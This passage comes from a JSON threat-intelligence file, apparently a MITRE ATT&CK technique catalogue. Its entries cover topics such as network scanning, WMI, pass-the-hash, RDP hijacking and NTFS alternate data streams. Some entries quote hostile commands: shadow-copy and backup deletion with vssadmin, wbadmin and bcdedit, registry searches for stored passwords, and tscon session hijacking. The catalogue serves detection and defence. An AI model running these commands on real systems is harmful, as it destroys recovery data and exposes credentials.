          "https://usmile.at/symposium/program/2015/ekberg",
          "http://bits-please.blogspot.co.il/2016/05/war-of-worlds-hijacking-linux-kernel.html"
        ]
      },
      "uuid": "ef771e03-e080-43b4-a619-ac6f84899884",
      "value": "Exploit TEE Vulnerability - T1405"
    },
    {
      "description": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems.",
      "meta": {
        "external_id": "CAPEC-300",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Netflow/Enclave netflow",
          "Network protocol analysis",
          "Packet capture",
          "Process command-line parameters",
          "Process use of network"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1046",
          "https://capec.mitre.org/data/definitions/300.html"
        ]
      },
      "uuid": "e3a12395-188d-4051-9a16-ea8e14d07b88",
      "value": "Network Service Scanning - T1046"
    },
    {
      "description": "Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)",
      "meta": {
        "external_id": "T1047",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Authentication logs",
          "Netflow/Enclave netflow",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1047",
          "https://en.wikipedia.org/wiki/Server_Message_Block",
          "https://technet.microsoft.com/en-us/library/cc787851.aspx",
          "https://msdn.microsoft.com/en-us/library/aa394582.aspx",
          "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"
        ]
      },
      "uuid": "01a5a209-b94c-450b-b7f9-946497d91055",
      "value": "Windows Management Instrumentation - T1047"
    },
    {
      "description": "Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>",
      "meta": {
        "external_id": "T1490",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "Services",
          "Windows event logs",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS",
          "Linux"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1490",
          "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
          "https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html"
        ]
      },
      "uuid": "f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a",
      "value": "Inhibit System Recovery - T1490"
    },
    {
      "description": "Adversaries may abuse legitimate extensible development features of server applications to establish persistent access to systems. Enterprise server applications may include features that allow application developers to write and install software to extend the functionality of the main application. Adversaries may install malicious software components to maliciously extend and abuse server applications.\n\n###Transport Agent\nMicrosoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.\n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.\n\n###SQL Stored Procedures\nSQL stored procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted). Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as <code>xp_cmdshell</code> for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017)\n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures, these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)",
      "meta": {
        "external_id": "T1505",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Application logs"
        ],
        "mitre_platforms": [
          "Windows",
          "Linux"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1505",
          "https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help",
          "https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf",
          "https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/",
          "https://securelist.com/malicious-tasks-in-ms-sql-server/92167/",
          "https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017",
          "https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration/common-language-runtime-integration-overview?view=sql-server-2017",
          "https://blog.netspi.com/attacking-sql-server-clr-assemblies/"
        ]
      },
      "uuid": "d456de47-a16f-4e46-8980-e67478a12dcb",
      "value": "Server Software Component - T1505"
    },
    {
      "description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), the adversary then imports the cookie into a browser they control and is able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019) ",
      "meta": {
        "external_id": "T1506",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "Authentication logs",
          "Office 365 account logs"
        ],
        "mitre_platforms": [
          "Office 365",
          "SaaS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1506",
          "https://wunderwuzzi23.github.io/blog/passthecookie.html",
          "https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/"
        ]
      },
      "uuid": "c5e31fb5-fcbd-48a4-af8c-5a6ed5b932e5",
      "value": "Web Session Cookie - T1506"
    },
    {
      "description": "Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.",
      "meta": {
        "external_id": "T1065",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Netflow/Enclave netflow",
          "Process use of network",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1065",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "c848fcf7-6b62-4bde-8216-b6c157d48da0",
      "value": "Uncommonly Used Port - T1065"
    },
    {
      "description": "Adversaries may use device sensors to collect information about nearby networks, such as Wi-Fi and Bluetooth.",
      "meta": {
        "external_id": "T1507",
        "kill_chain": [
          "mitre-mobile-attack:collection"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1507"
        ]
      },
      "uuid": "e4c347e9-fb91-4bc5-83b8-391e389131e2",
      "value": "Network Information Discovery - T1507"
    },
    {
      "description": "Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. \n\nWindows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. (Citation: NSA Spotting)",
      "meta": {
        "external_id": "CAPEC-644",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "Authentication logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1075",
          "https://capec.mitre.org/data/definitions/644.html",
          "https://www.iad.gov/iad/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm"
        ]
      },
      "uuid": "c23b740b-a42b-47a1-aec2-9d48ddd547ff",
      "value": "Pass the Hash - T1075"
    },
    {
      "description": "A malicious application could suppress its icon from being displayed to the user in the application launcher to hide the fact that it is installed, and to make it more difficult for the user to uninstall the application. Hiding the application's icon programmatically does not require any special permissions.\n\nThis behavior has been seen in the BankBot/Spy Banker and SimBad families of malware.(Citation: android-trojan-steals-paypal-2fa)(Citation: sunny-stolen-credentials)(Citation: bankbot-spybanker)(Citation: simbad-adware)",
      "meta": {
        "external_id": "T1508",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1508",
          "https://www.welivesecurity.com/2018/12/11/android-trojan-steals-money-paypal-accounts-2fa/",
          "https://www.welivesecurity.com/2017/02/22/sunny-chance-stolen-credentials-malicious-weather-app-found-google-play/",
          "https://www.cyber.nj.gov/threat-profiles/android-malware-variants/bankbot-spybanker",
          "https://research.checkpoint.com/simbad-a-rogue-adware-campaign-on-google-play/"
        ]
      },
      "uuid": "fd658820-cbba-4c95-8ac9-0fac6b1099e2",
      "value": "Suppress Application Icon - T1508"
    },
    {
      "description": "Adversaries may use non-standard ports to exfiltrate information.",
      "meta": {
        "external_id": "T1509",
        "kill_chain": [
          "mitre-mobile-attack:command-and-control"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1509"
        ]
      },
      "uuid": "948a447c-d783-4ba0-8516-a64140fcacd5",
      "value": "Uncommonly Used Port - T1509"
    },
    {
      "description": "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)",
      "meta": {
        "external_id": "CAPEC-555",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "Authentication logs",
          "Netflow/Enclave netflow",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1076",
          "https://capec.mitre.org/data/definitions/555.html",
          "https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx",
          "http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/",
          "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
          "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
          "https://github.com/nccgroup/redsnarf"
        ]
      },
      "uuid": "51dea151-0898-4a45-967c-3ebee0420484",
      "value": "Remote Desktop Protocol - T1076"
    },
    {
      "description": "Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",
      "meta": {
        "external_id": "T1096",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Kernel drivers",
          "API monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1096",
          "https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea",
          "https://blogs.technet.microsoft.com/askcore/2010/08/25/ntfs-file-attributes/",
          "http://msdn.microsoft.com/en-us/library/aa364404",
          "https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/",
          "https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/",
          "http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html",
          "https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/",
          "https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/",
          "https://www.symantec.com/connect/articles/what-you-need-know-about-alternate-data-streams-windows-your-data-secure-can-you-restore"
        ]
      },
      "uuid": "f2d44246-91f1-478a-b6c8-1227e0ca109d",
      "value": "NTFS File Attributes - T1096"
    },
    {
      "description": "Adversaries may attempt to find local system or domain-level groups and permissions settings. \n\n### Windows\n\nExamples of commands that can list groups are <code>net group /domain</code> and <code>net localgroup</code> using the [Net](https://attack.mitre.org/software/S0039) utility.\n\n### Mac\n\nOn Mac, this same thing can be accomplished with the <code>dscacheutil -q group</code> for the domain, or <code>dscl . -list /Groups</code> for local groups.\n\n### Linux\n\nOn Linux, local groups can be enumerated with the <code>groups</code> command and domain groups via the <code>ldapsearch</code> command.\n\n### Office 365 and Azure AD\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.(Citation: Microsoft msrole)(Citation: GitHub Raindance)\n\nAzure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command <code>az ad user get-member-groups</code> will list groups associated to a user account.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)",
      "meta": {
        "external_id": "CAPEC-576",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "Office 365 account logs",
          "API monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "Office 365",
          "Azure AD"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1069",
          "https://capec.mitre.org/data/definitions/576.html",
          "https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrole?view=azureadps-1.0",
          "https://github.com/True-Demon/raindance",
          "https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest",
          "https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/"
        ]
      },
      "uuid": "15dbf668-795c-41e6-8219-f0447c0e64ce",
      "value": "Permission Groups Discovery - T1069"
    },
    {
      "description": "Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. \n\nAdversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1075) and certain configuration and patch levels. (Citation: Microsoft Admin Shares)\n\nThe [Net](https://attack.mitre.org/software/S0039) utility can be used to connect to Windows admin shares on remote systems using <code>net use</code> commands with valid credentials. (Citation: Technet Net Use)",
      "meta": {
        "external_id": "CAPEC-561",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "Process use of network",
          "Authentication logs",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1077",
          "https://capec.mitre.org/data/definitions/561.html",
          "https://en.wikipedia.org/wiki/Server_Message_Block",
          "https://technet.microsoft.com/en-us/library/cc787851.aspx",
          "http://support.microsoft.com/kb/314984",
          "https://technet.microsoft.com/bb490717.aspx",
          "http://blogs.technet.com/b/jepayne/archive/2015/11/27/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts.aspx",
          "http://blogs.technet.com/b/jepayne/archive/2015/11/24/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem.aspx",
          "https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc"
        ]
      },
      "uuid": "ffe742ed-9100-4686-9e00-c331da544787",
      "value": "Windows Admin Shares - T1077"
    },
    {
      "description": "Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nIn this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)\n\nSilver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)\n\nGolden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)",
      "meta": {
        "external_id": "CAPEC-645",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "Authentication logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1097",
          "https://capec.mitre.org/data/definitions/645.html",
          "https://adsecurity.org/?p=556",
          "http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos",
          "http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf",
          "https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf"
        ]
      },
      "uuid": "a257ed11-ff3b-4216-8c9d-3938ef57064c",
      "value": "Pass the Ticket - T1097"
    },
    {
      "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.",
      "meta": {
        "external_id": "CAPEC-578",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "File monitoring",
          "Services",
          "Windows Registry",
          "Process command-line parameters",
          "Anti-virus"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1089",
          "https://capec.mitre.org/data/definitions/578.html"
        ]
      },
      "uuid": "2e0dd10b-676d-4964-acd0-8a404c92b044",
      "value": "Disabling Security Tools - T1089"
    },
    {
      "description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to \"evil.txt \" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). \n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
      "meta": {
        "external_id": "CAPEC-649",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1151",
          "https://capec.mitre.org/data/definitions/649.html",
          "https://arstechnica.com/security/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/"
        ]
      },
      "uuid": "e2907cea-4b43-4ed7-a570-0fdf0fbeea00",
      "value": "Space after Filename - T1151"
    },
    {
      "description": "Strategic plans outline the mission, vision, and goals for an adversary at a high level in relation to the key partners, topics, and functions the adversary carries out. (Citation: KPMGChina5Year) (Citation: China5YearPlans) (Citation: ChinaUN)",
      "meta": {
        "external_id": "T1231",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1231"
        ]
      },
      "uuid": "ec739e26-d097-4804-b04a-54dd81ff11e0",
      "value": "Create strategic plan - T1231"
    },
    {
      "description": "A malicious application could capture sensitive data sent via SMS, including authentication credentials. SMS is frequently used to transmit codes used for multi-factor authentication.\n\nOn Android, a malicious application must request and obtain permission (either at app install time or run time) in order to receive SMS messages. Alternatively, a malicious application could attempt to perform an operating system privilege escalation attack to bypass the permission requirement.\n\nOn iOS, applications cannot access SMS messages in normal operation, so an adversary would need to attempt to perform an operating system privilege escalation attack to potentially be able to access SMS messages.",
      "meta": {
        "external_id": "T1412",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1412"
        ]
      },
      "uuid": "e8b4e1ec-8e3b-484c-9038-4459b1ed8060",
      "value": "Capture SMS Messages - T1412"
    },
    {
      "description": "The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
      "meta": {
        "external_id": "T1214",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1214",
          "https://pentestlab.blog/2017/04/19/stored-credentials/"
        ]
      },
      "uuid": "2edd9d6a-5674-4326-a600-ba56de467286",
      "value": "Credentials in Registry - T1214"
    },
    {
      "description": "The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)\n\nAn adversary may gather the system time and/or time zone from a local or remote system. This information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a [Scheduled Task](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting.",
      "meta": {
        "external_id": "CAPEC-295",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1124",
          "https://capec.mitre.org/data/definitions/295.html",
          "https://msdn.microsoft.com/ms724961.aspx",
          "https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings",
          "https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf"
        ]
      },
      "uuid": "f3c544dc-673c-4ef3-accb-53229f1ae077",
      "value": "System Time Discovery - T1124"
    },
    {
      "description": "An adversary undergoes an iterative target selection process that may begin either broadly and narrow down into specifics (strategic to tactical) or narrowly and expand outward (tactical to strategic).  As part of this process, an adversary may determine a high level target they wish to attack. One example of this may be a particular country, government, or commercial sector. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)",
      "meta": {
        "external_id": "T1241",
        "kill_chain": [
          "mitre-pre-attack:target-selection"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1241"
        ]
      },
      "uuid": "91a3735f-817a-4450-8ed4-f05a0f5c3877",
      "value": "Determine strategic target - T1241"
    },
    {
      "description": "Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",
      "meta": {
        "external_id": "T1521",
        "kill_chain": [
          "mitre-mobile-attack:command-and-control"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1521"
        ]
      },
      "uuid": "ed2c05a1-4f81-4d97-9e1b-aff01c34ae84",
      "value": "Standard Cryptographic Protocol - T1521"
    },
    {
      "description": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials in Files](https://attack.mitre.org/techniques/T1081) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",
      "meta": {
        "external_id": "T1217",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "File monitoring",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1217"
        ]
      },
      "uuid": "5e4a2073-9643-44cb-a0b5-e7f4048446c7",
      "value": "Browser Bookmark Discovery - T1217"
    },
    {
